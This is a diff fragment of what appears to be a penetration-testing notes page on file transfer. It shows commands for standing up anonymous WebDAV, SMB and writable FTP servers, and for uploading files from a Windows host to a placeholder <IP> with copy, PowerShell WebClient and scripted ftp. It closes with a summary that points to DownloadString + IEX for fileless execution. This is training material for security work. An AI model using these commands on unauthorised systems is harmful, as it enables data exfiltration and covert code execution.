+sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
+</code></pre>
+<p><strong>Upload from Windows:</strong></p>
+<pre><code class="language-cmd">copy &lt;file&gt; \\&lt;IP&gt;\DavWWWRoot\
+# Or specify folder:
+copy &lt;file&gt; \\&lt;IP&gt;\&lt;sharefolder&gt;\
+</code></pre>
+<p><strong>Note:</strong> <code>DavWWWRoot</code> is a special keyword - no actual folder exists. Can also use <code>net use</code> to mount if needed.</p>
+<p><strong>If SMB allowed, use Impacket:</strong></p>
+<pre><code class="language-bash">sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
+</code></pre>
+<h3 id="ftp-uploads-1"><a class="header" href="#ftp-uploads-1">FTP Uploads</a></h3>
+<p><strong>Setup FTP server with write permissions:</strong></p>
+<pre><code class="language-bash">sudo python3 -m pyftpdlib --port 21 --write
+</code></pre>
+<p><strong>Upload with PowerShell:</strong></p>
+<pre><code class="language-powershell">(New-Object Net.WebClient).UploadFile('ftp://&lt;IP&gt;/filename', '&lt;local_file_path&gt;')
+</code></pre>
+<p><strong>Upload with FTP client (non-interactive):</strong></p>
+<pre><code class="language-cmd">echo open &lt;IP&gt; &gt; ftpcommand.txt
+echo USER anonymous &gt;&gt; ftpcommand.txt
+echo binary &gt;&gt; ftpcommand.txt
+echo PUT &lt;file&gt; &gt;&gt; ftpcommand.txt
+echo bye &gt;&gt; ftpcommand.txt
+ftp -v -n -s:ftpcommand.txt
+</code></pre>
+<h2 id="summary-2"><a class="header" href="#summary-2">Summary</a></h2>
+<ul>
+<li><strong>Base64</strong>: No network needed, limited by terminal length</li>
+<li><strong>PowerShell WebClient</strong>: HTTP/HTTPS, most common, supports fileless execution</li>
+<li><strong>SMB</strong>: Common in enterprise, often blocked outbound (use WebDAV)</li>
+<li><strong>FTP</strong>: Alternative protocol, requires server setup</li>
+<li><strong>Fileless attacks</strong>: Use DownloadString + IEX to execute in memory without touching disk</li>
+</ul>
 
                     </main>
 
